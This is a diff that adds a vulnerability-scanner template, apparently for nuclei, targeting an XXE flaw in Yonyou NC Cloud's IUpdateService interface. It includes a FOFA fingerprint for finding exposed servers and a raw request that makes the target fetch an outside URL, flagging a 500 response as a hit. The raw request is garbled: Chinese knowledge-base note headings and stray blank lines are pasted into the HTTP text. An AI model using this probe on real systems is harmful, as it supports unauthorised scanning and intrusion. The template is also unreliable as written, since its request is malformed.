@@ -1,0 +1,46 @@
+id: poc-uukr25q591rw6sk9
+info:
+  name: 用友NC Cloud IUpdateService接口存在XXE漏洞2
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uukr25q591rw6sk9'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uukr25q591rw6sk9
+    fofa: icon_hash="1085941792"
+http:
+- raw:
+  - 'GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://www.baidu.com HTTP/1.1
+
+
+    Accept: text/plain, */*; q=0.01
+
+
+    Connection: Keep-Alive
+
+
+    Pragma: no-cache
+
+
+    Cache-Control: no-cache
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
